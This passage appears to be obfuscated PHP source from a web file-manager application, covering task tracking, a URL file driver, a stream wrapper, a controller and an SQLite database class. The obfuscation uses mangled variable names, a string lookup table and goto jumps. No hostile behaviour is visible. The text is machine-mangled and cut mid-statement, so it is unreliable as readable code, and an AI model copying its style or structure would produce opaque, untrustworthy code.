$“³°Ææ¤; } private static function valueSet($ò¦ĞÓµ„, $ıœõ™Ÿ€) { $­Øßß¦‹ =& $_SERVER[ä¿÷‹µ±]; $Ëñ–Ë¬¯ = $­Øßß¦‹[1676]; CacheLock::lock($Ëñ–Ë¬¯); $ş‰ŒÙ§ = Model($­Øßß¦‹[435])->set($ò¦ĞÓµ„, $ıœõ™Ÿ€, $­Øßß¦‹[1675]); CacheLock::unlock($Ëñ–Ë¬¯); return $ş‰ŒÙ§; } protected static function log($½ˆîÜŸŒ) { write_log($½ˆîÜŸŒ, $_SERVER[ä¿÷‹µ±][1662]); } private static function cacheClear() { $”Œ³°Ì¯ =& $_SERVER[ä¿÷‹µ±]; Cache::clearMemory(Model($”Œ³°Ì¯[435])->cacheKey($”Œ³°Ì¯[1675])); Cache::clearMemory(Model($”Œ³°Ì¯[435])->cacheKey($”Œ³°Ì¯[1677])); Model($”Œ³°Ì¯[1647])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($œù½´ ş, $°á— ßÌ = '', $ñîü¤Ñ = 0, $×È¶å÷¾ = '') { $ì–óéÅı =& $_SERVER[ä¿÷‹µ±]; if (self::get($œù½´ ş)) { return; } $this->task = array($ì–óéÅı[399] => $œù½´ ş, $ì–óéÅı[1678] => USER_ID, $ì–óéÅı[1576] => $×È¶å÷¾, $ì–óéÅı[33] => $°á— ßÌ, $ì–óéÅı[1086] => $ì–óéÅı[12], $ì–óéÅı[805] => $ñîü¤Ñ, $ì–óéÅı[1679] => 0, $ì–óéÅı[1680] => 0, $ì–óéÅı[1681] => 0, $ì–óéÅı[1682] => timeFloat(), $ì–óéÅı[1683] => 0, $ì–óéÅı[1684] => 0, $ì–óéÅı[1685] => 0, $ì–óéÅı[1686] => 0, $ì–óéÅı[769] => $ì–óéÅı[1637]); $GLOBALS[$ì–óéÅı[1687]] = 1; Hook::bind($ì–óéÅı[1642], array($this, $ì–óéÅı[1688])); Hook::bind($ì–óéÅı[1689], array($this, $ì–óéÅı[1690])); $this->startAfter(); Hook::trigger($ì–óéÅı[1691], $this->task); $this->task[$ì–óéÅı[1684]] = timeFloat(); } public function end() { $»Å®¨³§ =& $_SERVER[ä¿÷‹µ±]; if (!$this->task) { return; } if ($this->task[$»Å®¨³§[1684]]) { self::valueSet($this->task[$»Å®¨³§[399]], !1); } $‘¬µçÈÍ = timeFloat() - $this->task[$»Å®¨³§[1682]]; self::log($»Å®¨³§[1692] . $this->task[$»Å®¨³§[399]] . $»Å®¨³§[1693] . $‘¬µçÈÍ . $»Å®¨³§[1694]); Hook::unbind($»Å®¨³§[1642], array($this, $»Å®¨³§[1688])); Hook::unbind($»Å®¨³§[1689], array($this, $»Å®¨³§[1690])); $this->endAfter(); $this->task = !1; } public function update($Õ§Õµ°» = 0, $óì˜œî = false) { $ŞÅƒÂÇ =& $_SERVER[ä¿÷‹µ±]; $†íÅÆ€˜ =& $this->task; if (!$†íÅÆ€˜) { return; } $†íÅÆ€˜[$ŞÅƒÂÇ[1679]] += $Õ§Õµ°»; $†íÅÆ€˜[$ŞÅƒÂÇ[1683]] = timeFloat(); if ($†íÅÆ€˜[$ŞÅƒÂÇ[805]]) { if ($†íÅÆ€˜[$ŞÅƒÂÇ[805]] < $†íÅÆ€˜[$ŞÅƒÂÇ[1679]]) { $†íÅÆ€˜[$ŞÅƒÂÇ[805]] = $†íÅÆ€˜[$ŞÅƒÂÇ[1679]]; } $Ï‚ãÅ³ = timeFloat() - $†íÅÆ€˜[$ŞÅƒÂÇ[1682]] - $†íÅÆ€˜[$ŞÅƒÂÇ[1685]]; if ($Ï‚ãÅ³ <= 0) { $Ï‚ãÅ³ = 0.001; } $†íÅÆ€˜[$ŞÅƒÂÇ[1680]] = $†íÅÆ€˜[$ŞÅƒÂÇ[1679]] / $†íÅÆ€˜[$ŞÅƒÂÇ[805]]; $†íÅÆ€˜[$ŞÅƒÂÇ[1681]] = $†íÅÆ€˜[$ŞÅƒÂÇ[1679]] / $Ï‚ãÅ³; if ($†íÅÆ€˜[$ŞÅƒÂÇ[1680]] > 0) { $†íÅÆ€˜[$ŞÅƒÂÇ[1686]] = $Ï‚ãÅ³ * (1 - $†íÅÆ€˜[$ŞÅƒÂÇ[1680]]) / $†íÅÆ€˜[$ŞÅƒÂÇ[1680]]; } $†íÅÆ€˜[$ŞÅƒÂÇ[1686]] = $†íÅÆ€˜[$ŞÅƒÂÇ[1686]] <= 0 ? 0 : $†íÅÆ€˜[$ŞÅƒÂÇ[1686]]; } $this->updateAfter(); $®ÃùÏÇ = 0.2; if (timeFloat() - $†íÅÆ€˜[$ŞÅƒÂÇ[1684]] < $®ÃùÏÇ && !$óì˜œî) { return; } $×òé€¹ = self::get($†íÅÆ€˜[$ŞÅƒÂÇ[399]]); $ç°‹½­° = $×òé€¹[$ŞÅƒÂÇ[769]]; if ($ç°‹½­° == self::STATYS_KILL) { $àşÏ€í = array($ŞÅƒÂÇ[1695] => LNG($ŞÅƒÂÇ[1696]), $ŞÅƒÂÇ[1213] => !1); Cache::set($ŞÅƒÂÇ[1697] . $this->task[$ŞÅƒÂÇ[399]], $àşÏ€í, 30); $this->onKill(); $this->end(); die; } else { if ($ç°‹½­° == self::STATYS_STOP) { $ó´€’Õé = 2; $×òé€¹[$ŞÅƒÂÇ[1685]] += $ó´€’Õé; self::valueSet($†íÅÆ€˜[$ŞÅƒÂÇ[399]], $×òé€¹); sleep($ó´€’Õé); $this->update(); return; } } $†íÅÆ€˜[$ŞÅƒÂÇ[769]] = $ç°‹½­° ? $ç°‹½­° : $†íÅÆ€˜[$ŞÅƒÂÇ[769]]; $†íÅÆ€˜[$ŞÅƒÂÇ[1685]] = $×òé€¹[$ŞÅƒÂÇ[1685]] ? $×òé€¹[$ŞÅƒÂÇ[1685]] : 0; $†íÅÆ€˜[$ŞÅƒÂÇ[1684]] = timeFloat(); Hook::trigger($ŞÅƒÂÇ[1698], $†íÅÆ€˜); self::valueSet($†íÅÆ€˜[$ŞÅƒÂÇ[399]], $†íÅÆ€˜); } public function onKillSet($–ß¦Ñ„, $ó‹ïÌ¬ = array()) { $this->onKillCall = array($–ß¦Ñ„, $ó‹ïÌ¬); } public function onKill() { $˜Ü÷ùîÑ =& $_SERVER[ä¿÷‹µ±]; self::log($˜Ü÷ùîÑ[1692] . $this->task[$˜Ü÷ùîÑ[399]] . $˜Ü÷ùîÑ[1699]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ä¢“¢Ğ) { $ÌšØ“ =& $_SERVER[ä¿÷‹µ±]; Cache::set($ÌšØ“[1697] . $this->task[$ÌšØ“[399]], $Ä¢“¢Ğ, 60); return $Ä¢“¢Ğ; } public static function get($ô•ŞÑ·ñ) { $ˆ ¤ë =& $_SERVER[ä¿÷‹µ±]; $áíµ­£ = self::valueGet($ô•ŞÑ·ñ); if (is_array($áíµ­£) && $áíµ­£[$ˆ ¤ë[1700]]) { $”Ò¶ÍÙş = ActionApply($áíµ­£[$ˆ ¤ë[1700]], array($áíµ­£)); $áíµ­£ = is_array($”Ò¶ÍÙş) ? $”Ò¶ÍÙş : $áíµ­£; } return $áíµ­£; } public static function listData() { $Íóì¿úô = self::valueGet(); return array_sort_by($Íóì¿úô, $_SERVER[ä¿÷‹µ±][1682], !0); } public static function kill($ñ¸ÚóÒ“) { return self::changeStatus($ñ¸ÚóÒ“, self::STATYS_KILL); } public static function stop($÷üÍÀ×ª) { return self::changeStatus($÷üÍÀ×ª, self::STATYS_STOP); } public static function restart($üşô¦) { return self::changeStatus($üşô¦, self::STATYS_RUNNING); } public static function killAll() { $¬ãÛ®¢Ş =& $_SERVER[ä¿÷‹µ±]; $–ØÀŞü‹ = self::listData(); foreach ($–ØÀŞü‹ as $é¹üìÓ·) { self::kill($é¹üìÓ·[$¬ãÛ®¢Ş[399]]); } sleep(2); foreach ($–ØÀŞü‹ as $é¹üìÓ·) { self::valueSet($é¹üìÓ·[$¬ãÛ®¢Ş[399]], !1); } } private static function changeStatus($Æó½ĞÜŞ, $Õ¼§¼”š) { $ç¶Ï¢Ò =& $_SERVER[ä¿÷‹µ±]; $•—›ÎË¹ = self::valueGet($Æó½ĞÜŞ); if (!$•—›ÎË¹) { return !1; } $•—›ÎË¹[$ç¶Ï¢Ò[769]] = $Õ¼§¼”š; self::valueSet($Æó½ĞÜŞ, $•—›ÎË¹); self::log($ç¶Ï¢Ò[1701] . $•—›ÎË¹[$ç¶Ï¢Ò[399]] . $ç¶Ï¢Ò[1702] . $Õ¼§¼”š); return !0; } public static function valueGet($Šëİ÷¨é = false) { $›ÖÈ‡— =& $_SERVER[ä¿÷‹µ±]; if ($Šëİ÷¨é) { $äÀ¿ô»† = Model($›ÖÈ‡—[447])->where(array($›ÖÈ‡—[94] => $Šëİ÷¨é, $›ÖÈ‡—[33] => $›ÖÈ‡—[1093]))->find(); return $äÀ¿ô»† ? json_decode($äÀ¿ô»†[$›ÖÈ‡—[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Á—©òêÚ = false) { $¢°ÀøÙ =& $_SERVER[ä¿÷‹µ±]; $‚ââÁ¼ = array($¢°ÀøÙ[33] => $¢°ÀøÙ[1093]); if ($Á—©òêÚ) { $‚ââÁ¼[$¢°ÀøÙ[1678]] = $Á—©òêÚ; } $Äã¶¸Ô = Model($¢°ÀøÙ[447])->where($‚ââÁ¼)->select(); $Äã¶¸Ô = $Äã¶¸Ô ? $Äã¶¸Ô : array(); foreach ($Äã¶¸Ô as $®àßí…ö => $šœÕ›Ÿù) { $Äã¶¸Ô[$®àßí…ö] = json_decode($šœÕ›Ÿù[$¢°ÀøÙ[374]], !0); } return $Äã¶¸Ô; } public static function valueSet($ºéô…ŞÔ, $Ù”¥íû™) { $³Ù’…‘ =& $_SERVER[ä¿÷‹µ±]; if (!$Ù”¥íû™) { return Model($³Ù’…‘[447])->where(array($³Ù’…‘[94] => $ºéô…ŞÔ, $³Ù’…‘[33] => $³Ù’…‘[1093]))->delete(); } $é¯¥ê˜æ = json_encode($Ù”¥íû™); if (!$é¯¥ê˜æ) { ob_start(); var_dump($Ù”¥íû™); $ÒÊŞæù = ob_get_clean(); self::log($³Ù’…‘[1703] . json_encode_force($ÒÊŞæù)); } if (!$ºéô…ŞÔ || !$Ù”¥íû™[$³Ù’…‘[399]]) { return !1; } $ÛÈ¥‚Ò = array($³Ù’…‘[33] => $³Ù’…‘[1093], $³Ù’…‘[1678] => USER_ID, $³Ù’…‘[94] => $ºéô…ŞÔ, $³Ù’…‘[374] => $é¯¥ê˜æ); $åô”áê = $³Ù’…‘[1704]; CacheLock::lock($åô”áê); Model($³Ù’…‘[447])->add($ÛÈ¥‚Ò, array(), !0); CacheLock::unlock($åô”áê); } public static function log($¸§´øÛ“) { if (!GLOBAL_DEBUG) { return; } write_log($¸§´øÛ“, $_SERVER[ä¿÷‹µ±][1705]); } } goto a‡­é¥êÂˆ; AÄ­“­íÃÈ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($íá¡ßúØ = false) { } public function exist($ÒÜâÊ¦) { $üÊ“˜âå = $this->info($ÒÜâÊ¦); return $üÊ“˜âå[$_SERVER[ä¿÷‹µ±][201]]; } public function isFile($ß‰Î¦ò–) { $û‡ÃÒà” = $this->info($ß‰Î¦ò–); return $û‡ÃÒà”[$_SERVER[ä¿÷‹µ±][201]]; } public function isFolder($Ø†Ñ›â’) { return !1; } public function size($®«ùÜ×ë) { $šá²¯Ø¾ = $this->info($®«ùÜ×ë); return $šá²¯Ø¾[$_SERVER[ä¿÷‹µ±][76]]; } public function info($û£ñØ) { return $this->infoParse($û£ñØ); } public function infoAuth($à¾³æÒÚ) { return $this->infoParse($à¾³æÒÚ); } public function infoWithChildren($ûš¿“ŸÓ) { return $this->infoParse($ûš¿“ŸÓ); } public function infoFull($¸ÃŞÒ€˜) { return $this->infoParse($¸ÃŞÒ€˜); } private function infoParse($ÏãÏ‰‚) { $®ÍŸª˜Ã =& $_SERVER[ä¿÷‹µ±]; $ÆëæÎ«Ù = $this->header($ÏãÏ‰‚); if (!$ÆëæÎ«Ù || !$ÆëæÎ«Ù[$®ÍŸª˜Ã[769]]) { return !1; } $ˆ³Áî·¹ = _get($ÆëæÎ«Ù, $®ÍŸª˜Ã[337], 0); $ÊßŸçç = array($®ÍŸª˜Ã[32] => $ÆëæÎ«Ù[$®ÍŸª˜Ã[32]], $®ÍŸª˜Ã[84] => $ÏãÏ‰‚, $®ÍŸª˜Ã[33] => $®ÍŸª˜Ã[199], $®ÍŸª˜Ã[76] => intval($ˆ³Áî·¹), $®ÍŸª˜Ã[174] => get_path_ext($ÆëæÎ«Ù[$®ÍŸª˜Ã[32]]), $®ÍŸª˜Ã[1400] => $ˆ³Áî·¹ > 0 && $ÆëæÎ«Ù[$®ÍŸª˜Ã[1522]], $®ÍŸª˜Ã[1401] => !1); return $ÊßŸçç; } private function header($ĞèÖñ£ê) { $“í¿çş =& $_SERVER[ä¿÷‹µ±]; if (isset(self::$_cacheHeader[$ĞèÖñ£ê])) { return self::$_cacheHeader[$ĞèÖñ£ê]; } $¥Î¤¶‘Ü = isset($GLOBALS[$“í¿çş[1523]]) ? $GLOBALS[$“í¿çş[1523]] : !1; $GLOBALS[$“í¿çş[1523]] = !0; self::$_cacheHeader[$ĞèÖñ£ê] = url_header($ĞèÖñ£ê); $GLOBALS[$“í¿çş[1523]] = $¥Î¤¶‘Ü; return self::$_cacheHeader[$ĞèÖñ£ê]; } public function hashSimple($áçàÄÖ, $ñ“îäé‚ = false) { $§µı¾Ï =& $_SERVER[ä¿÷‹µ±]; $ı€áöØ‚ = $this->info($áçàÄÖ); if (!$ı€áöØ‚ || !$ı€áöØ‚[$§µı¾Ï[201]]) { return !1; } $äæ›çÀŸ = $ı€áöØ‚[$§µı¾Ï[76]]; $°ÔÈÛµõ = 200; $Ôş„­÷ª = 50; if ($äæ›çÀŸ <= $°ÔÈÛµõ * $Ôş„­÷ª) { return md5($this->fileSubstr($áçàÄÖ, 0, $äæ›çÀŸ)) . $äæ›çÀŸ; } $¼—”Ó = intval($äæ›çÀŸ / $Ôş„­÷ª); $õ–İÌöŠ = $§µı¾Ï[12]; $ÊºŸ€ÁÅ = timeFloat(); $‚Şı³Çò = 15; for ($©ı“šâı = 0; $©ı“šâı < $Ôş„­÷ª; $©ı“šâı++) { if (timeFloat() - $ÊºŸ€ÁÅ > $‚Şı³Çò) { return !1; } $¶š¶ÒÁî = $this->fileSubstr($áçàÄÖ, $¼—”Ó * $©ı“šâı, $°ÔÈÛµõ); if (!$¶š¶ÒÁî) { return !1; } $õ–İÌöŠ .= $¶š¶ÒÁî; } $õ–İÌöŠ .= $this->fileSubstr($áçàÄÖ, $äæ›çÀŸ - $°ÔÈÛµõ, $°ÔÈÛµõ); return md5($õ–İÌöŠ) . $äæ›çÀŸ; } public function getContent($ğ™ ªóñ) { return $this->fileSubstr($ğ™ ªóñ); } public function fileSubstr($»¨¥µ¹¼, $·ìß…¨ì = 0, $²¡’™Ğ” = -1) { $È´‘³ï =& $_SERVER[ä¿÷‹µ±]; $£ºÂ¶Öí = $this->info($»¨¥µ¹¼); if (!$£ºÂ¶Öí || !$£ºÂ¶Öí[$È´‘³ï[201]] && $£ºÂ¶Öí[$È´‘³ï[76]] > 1024 * 1024 * 10) { return !1; } if ($²¡’™Ğ” === -1) { $²¡’™Ğ” = $£ºÂ¶Öí[$È´‘³ï[76]]; } if ($²¡’™Ğ” == 0) { return $È´‘³ï[12]; } $êÍ¯Ã‹µ = array($È´‘³ï[1524] . $·ìß…¨ì . $È´‘³ï[801] . ($·ìß…¨ì + $²¡’™Ğ” - 1)); $¼àßğ± = url_request($»¨¥µ¹¼, $È´‘³ï[230], !1, $êÍ¯Ã‹µ, !1, !1, 1); return $¼àßğ±[$È´‘³ï[1215]] ? $¼àßğ±[$È´‘³ï[1215]] : $È´‘³ï[12]; } public function download($ù¸¥¹é«, $Ìƒüıé) { Downloader::start($ù¸¥¹é«, $Ìƒüıé); return $Ìƒüıé; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ä…Å€õÔ, $å‘ÒÛöŞ = '') { $this->info = $this->info($Ä…Å€õÔ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ä¿÷‹µ±][84]]; $this->pathOpen = $Ä…Å€õÔ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ä…Å€õÔ])) { self::$_chunkBuffer[$Ä…Å€õÔ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($—®ÛÁì¨) { $ö©–™Çó = $this->fileSubstr($this->pose, $—®ÛÁì¨); $this->pose += strlen($ö©–™Çó); return $ö©–™Çó; } public function stream_tell() { return $this->pose; } public function stream_seek($ğàìÕ¾Ì, $ñòƒ˜Ôû) { $½Òû³Ä =& $_SERVER[ä¿÷‹µ±]; if ($ñòƒ˜Ôû == SEEK_SET) { $this->pose = $ğàìÕ¾Ì; } else { if ($ñòƒ˜Ôû == SEEK_CUR) { $this->pose += $ğàìÕ¾Ì; } else { if ($ñòƒ˜Ôû == SEEK_END) { $this->pose = $this->info[$½Òû³Ä[76]] + intval($ğàìÕ¾Ì); } } } if ($ğàìÕ¾Ì < 0) { $this->pose = $this->info[$½Òû³Ä[76]] + $ğàìÕ¾Ì; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ä¿÷‹µ±][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ßÚ˜õî¤, $áÆ²·á§) { $ö¯ŞµÎæ =& $_SERVER[ä¿÷‹µ±]; $ş£ÆÔŠ = $this->info($ßÚ˜õî¤); return array($ö¯ŞµÎæ[1525] => 0, $ö¯ŞµÎæ[1526] => 0, $ö¯ŞµÎæ[16] => 32768 + 511, $ö¯ŞµÎæ[1527] => 0, $ö¯ŞµÎæ[1528] => 0, $ö¯ŞµÎæ[1529] => 0, $ö¯ŞµÎæ[1530] => 0, $ö¯ŞµÎæ[76] => $ş£ÆÔŠ[$ö¯ŞµÎæ[76]], $ö¯ŞµÎæ[1531] => $ş£ÆÔŠ[$ö¯ŞµÎæ[1399]], $ö¯ŞµÎæ[1487] => $ş£ÆÔŠ[$ö¯ŞµÎæ[85]], $ö¯ŞµÎæ[1486] => $ş£ÆÔŠ[$ö¯ŞµÎæ[200]], $ö¯ŞµÎæ[1532] => 0, $ö¯ŞµÎæ[1533] => 0); } static $fileInfo = array(); public function info($ª¤—á÷ ) { $¥²½ì = $_SERVER[ä¿÷‹µ±][1534]; if (isset(self::$fileInfo[$ª¤—á÷ ])) { return self::$fileInfo[$ª¤—á÷ ]; } if (substr($ª¤—á÷ , 0, strlen($¥²½ì)) != $¥²½ì) { return !1; } self::$fileInfo[$ª¤—á÷ ] = IO::info(substr($ª¤—á÷ , strlen($¥²½ì))); return self::$fileInfo[$ª¤—á÷ ]; } public static function read($ûéÆŒ«¥, $´ÍÕ……Ú, $¤ñù™¼œ) { if (!isset(self::$_fopenCache[$ûéÆŒ«¥])) { $ó‘ã®üŸ = new StreamWrapperIO(); $ó‘ã®üŸ->stream_open($ûéÆŒ«¥); self::$_fopenCache[$ûéÆŒ«¥] = $ó‘ã®üŸ; } $ó‘ã®üŸ = self::$_fopenCache[$ûéÆŒ«¥]; return $ó‘ã®üŸ->fileSubstr($´ÍÕ……Ú, $¤ñù™¼œ); } public static function _read($«µê½­ğ, $õè…‰ûì, $²°Œ«ê¤) { $Çå¤Œ =& $_SERVER[ä¿÷‹µ±]; $Ó³ş¤ğ± = fopen($«µê½­ğ, $Çå¤Œ[1403]); if (!$Ó³ş¤ğ±) { return $Çå¤Œ[12]; } $Ï Ş³ãï = 8192; fseek($Ó³ş¤ğ±, $õè…‰ûì, SEEK_SET); $ºÅû™…» = $Çå¤Œ[12]; $Ü‘›õ÷ = 0; while ($Ü‘›õ÷ < $²°Œ«ê¤) { $šÆ›À¿× = min($Ï Ş³ãï, $²°Œ«ê¤ - $Ü‘›õ÷); $ºÅû™…» .= fread($Ó³ş¤ğ±, $šÆ›À¿×); $Ü‘›õ÷ += $šÆ›À¿×; } fclose($Ó³ş¤ğ±); return $ºÅû™…»; } public function fileSubstr($ëşëˆ¶ó, $˜”¤Û‡ï) { $¼Í‹Ó¨ =& $_SERVER[ä¿÷‹µ±]; $´ıË¯Š¼ = $this->info[$¼Í‹Ó¨[76]]; $Üˆô¢ÔÏ = $ëşëˆ¶ó; $ê´‚ ŠÒ = $˜”¤Û‡ï; if ($ëşëˆ¶ó < 0) { $ëşëˆ¶ó = $´ıË¯Š¼ + $ëşëˆ¶ó; } if ($˜”¤Û‡ï === !1) { $˜”¤Û‡ï = $´ıË¯Š¼ - $ëşëˆ¶ó; } if ($ëşëˆ¶ó + $˜”¤Û‡ï > $´ıË¯Š¼) { $˜”¤Û‡ï = $´ıË¯Š¼ - $ëşëˆ¶ó; } if ($˜”¤Û‡ï <= 0) { return $¼Í‹Ó¨[12]; } if ($ëşëˆ¶ó < 0 || $ëşëˆ¶ó >= $´ıË¯Š¼ || $˜”¤Û‡ï <= 0 || $˜”¤Û‡ï > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\x69\x6c\x65\x52\x65\x61\x64\x20\x65\x72\x72\x6f\162\x21\x20\163\x74\141\162\164\x3d{$ëşëˆ¶ó}\73\154\145\156\x67\x74\150\x3d{$˜”¤Û‡ï}\73\x20\163\151\172\145\75{$´ıË¯Š¼}\73"); } $·‰Ä£ñÉ = 64 * 1024; $­è×ÖÂ· =& self::$_chunkBuffer[$this->path]; if (!$­è×ÖÂ·) { $­è×ÖÂ· = array(); } $Œ·ÓŞ†· = 0; $î©ÛÎ«¼ = 0; $ïÉıØˆ¢ = $¼Í‹Ó¨[12]; foreach ($­è×ÖÂ· as $Œ·ÓŞ†· => $ïÉıØˆ¢) { $Œ·ÓŞ†· = intval($Œ·ÓŞ†·); $î©ÛÎ«¼ = $Œ·ÓŞ†· + strlen($ïÉıØˆ¢); if ($ëşëˆ¶ó >= $î©ÛÎ«¼) { continue; } if ($ëşëˆ¶ó >= $Œ·ÓŞ†· && $ëşëˆ¶ó + $˜”¤Û‡ï <= $î©ÛÎ«¼) { return substr($ïÉıØˆ¢, $ëşëˆ¶ó - $Œ·ÓŞ†·, $˜”¤Û‡ï); } break; } if (count($­è×ÖÂ·) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¼Í‹Ó¨[1535], $¼Í‹Ó¨[1536] . count($­è×ÖÂ·) . "\73\163\164\x61\x72\x74\75{$ëşëˆ¶ó}\x2c\154\x65\156\147\x74\150\75{$˜”¤Û‡ï}\73\x70\157\x73\145\x3a{$Œ·ÓŞ†·}\176{$î©ÛÎ«¼}"); throw new Exception($¼Í‹Ó¨[1537]); } $©ôìÔÃ = intval($ëşëˆ¶ó / $·‰Ä£ñÉ) * $·‰Ä£ñÉ; $²ô•¤Å = ceil(($ëşëˆ¶ó + $˜”¤Û‡ï) / $·‰Ä£ñÉ) * $·‰Ä£ñÉ - $©ôìÔÃ; $ôˆãáäî = IO::fileSubstr($this->path, $©ôìÔÃ, $²ô•¤Å); $­è×ÖÂ·[$©ôìÔÃ . $¼Í‹Ó¨[12]] = $ôˆãáäî; ksort($­è×ÖÂ·); $èÒˆéÚã = substr($ôˆãáäî, $ëşëˆ¶ó - $©ôìÔÃ, $˜”¤Û‡ï); return $èÒˆéÚã; } private function log($Í§¼’”ù, $¯¼³‘„¹) { $ƒ••¨Ü® =& $_SERVER[ä¿÷‹µ±]; $¥£¯µÎ• = timeFloat() - $this->timeStart; write_log(sprintf($ƒ••¨Ü®[1538], $Í§¼’”ù, $this->info[$ƒ••¨Ü®[32]], $¥£¯µÎ•, $¯¼³‘„¹), $ƒ••¨Ü®[1205]); } } class Message { function __construct() { } public function send($ù“Ûê†ˆ = '', $Óğ‹æ— = array(), $Öä—¶¡Ê = "\x74\x65\x78\164") { $„¶æ˜Æ´ =& $_SERVER[ä¿÷‹µ±]; $ÕµÖµü¹ = array($„¶æ˜Æ´[33] => $„¶æ˜Æ´[1539], $„¶æ˜Æ´[774] => $ù“Ûê†ˆ); if (in_array($Öä—¶¡Ê, array($„¶æ˜Æ´[1539], $„¶æ˜Æ´[1540]))) { $ÕµÖµü¹[$„¶æ˜Æ´[33]] = $Öä—¶¡Ê; } $Óğ‹æ— = array($„¶æ˜Æ´[515] => isset($Óğ‹æ—[$„¶æ˜Æ´[515]]) ? $Óğ‹æ—[$„¶æ˜Æ´[515]] : $„¶æ˜Æ´[12], $„¶æ˜Æ´[600] => isset($Óğ‹æ—[$„¶æ˜Æ´[600]]) ? $Óğ‹æ—[$„¶æ˜Æ´[600]] : $„¶æ˜Æ´[12]); if (empty($ù“Ûê†ˆ) || empty($Óğ‹æ—[$„¶æ˜Æ´[515]]) && empty($Óğ‹æ—[$„¶æ˜Æ´[600]])) { return !1; } $Ô—Çöù = array($„¶æ˜Æ´[1480] => $ÕµÖµü¹, $„¶æ˜Æ´[1541] => $Óğ‹æ—); Hook::trigger($„¶æ˜Æ´[1542], $Ô—Çöù); } } goto FÔŞöòŞá; b”ÓğæÏ°¤: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÀÜê‘ÜÁ =& $_SERVER[ä¿÷‹µ±]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÀÜê‘ÜÁ[6]] =& $config; $this->values[$ÀÜê‘ÜÁ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÀÜê‘ÜÁ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ä…¨ Ò) { if (1 === func_num_args()) { $this->{$ä…¨ Ò} = new $ä…¨ Ò(); } else { $¨Ù½¼¡Ê = new ReflectionClass($ä…¨ Ò); $´ú‡‡¢ = func_get_args(); array_shift($´ú‡‡¢); $this->{$ä…¨ Ò} = $¨Ù½¼¡Ê->newInstanceArgs($´ú‡‡¢); } return $this->{$ä…¨ Ò}; } public function routeBind($ØàòÔõ¼, $Ê¼Øû®ª, $Äæøåãğ = 3) { $é£Éû =& $_SERVER[ä¿÷‹µ±]; $‡€×Êî€ = $this->in[$é£Éû[9]]; $ØàòÔõ¼ = str_replace($é£Éû[10], $é£Éû[11], trim(trim($ØàòÔõ¼, $é£Éû[8]), $é£Éû[12])); if (!$ØàòÔõ¼ || count($‡€×Êî€) <= $Äæøåãğ) { return !1; } $Ù×†º = !0; $îšâµ÷Œ = explode($é£Éû[8], $ØàòÔõ¼); for ($€­û°¼Ş = 0; $€­û°¼Ş < count($îšâµ÷Œ); $€­û°¼Ş++) { if ($îšâµ÷Œ[$€­û°¼Ş] != $‡€×Êî€[$Äæøåãğ + $€­û°¼Ş]) { $Ù×†º = !1; break; } } if (!$Ù×†º) { return; } call_user_func_array(array($this, $Ê¼Øû®ª), array()); } public function routeArgs($ÚŞİËÛà = 3) { $ï¾Ù”¨Ï = $this->in[$_SERVER[ä¿÷‹µ±][9]]; if (count($ï¾Ù”¨Ï) <= $ÚŞİËÛà) { return array(); } $öÎ°Ù•¸ = array(); for ($ÃäÉ‰î = $ÚŞİËÛà; $ÃäÉ‰î < count($ï¾Ù”¨Ï); $ÃäÉ‰î += 2) { $öÎ°Ù•¸[$ï¾Ù”¨Ï[$ÃäÉ‰î]] = $ï¾Ù”¨Ï[$ÃäÉ‰î + 1]; $this->in[$ï¾Ù”¨Ï[$ÃäÉ‰î]] = $ï¾Ù”¨Ï[$ÃäÉ‰î + 1]; } return $öÎ°Ù•¸; } protected function assign($öÜôıâˆ, $—Î§Ïáõ) { $this->values[$öÜôıâˆ] = $—Î§Ïáõ; } protected function display($åÙÀÖ©–) { ob_end_clean(); extract($this->values); require $this->tpl . $åÙÀÖ©–; } } class DbSqliteBase extends Db { public function __construct($“¿ÎäÒ¡ = '') { $¸ÒÓ´ìª =& $_SERVER[ä¿÷‹µ±]; if (!extension_loaded($¸ÒÓ´ìª[13])) { think_exception(think_lang($¸ÒÓ´ìª[14]) . $¸ÒÓ´ìª[15]); } if (!empty($“¿ÎäÒ¡)) { if (!isset($“¿ÎäÒ¡[$¸ÒÓ´ìª[16]])) { $“¿ÎäÒ¡[$¸ÒÓ´ìª[16]] = 438; } $this->config = $“¿ÎäÒ¡; if (empty($this->config[$¸ÒÓ´ìª[17]])) { $this->config[$¸ÒÓ´ìª[17]] = array(); } } } public function connect($›şß¯§Ô = '', $áãçÏë” = 0) { $Àõ¡Ú =& $_SERVER[ä¿÷‹µ±]; if (!isset($this->linkID[$áãçÏë”])) { if (empty($›şß¯§Ô)) { $›şß¯§Ô = $this->config; } $…½÷ûÈ‹ = !empty($›şß¯§Ô[$Àõ¡Ú[17]][$Àõ¡Ú[18]]) ? $›şß¯§Ô[$Àõ¡Ú[17]][$Àõ¡Ú[18]] : $this->pconnect; $Î½§³Ë = $…½÷ûÈ‹ ? $Àõ¡Ú[19] : $Àõ¡Ú[20]; $this->linkID[$áãçÏë”] = $Î½§³Ë($›şß¯§Ô[$Àõ¡Ú[21]], $›şß¯§Ô[$Àõ¡Ú[16]]); if (!$this->linkID[$áãçÏë”]) { 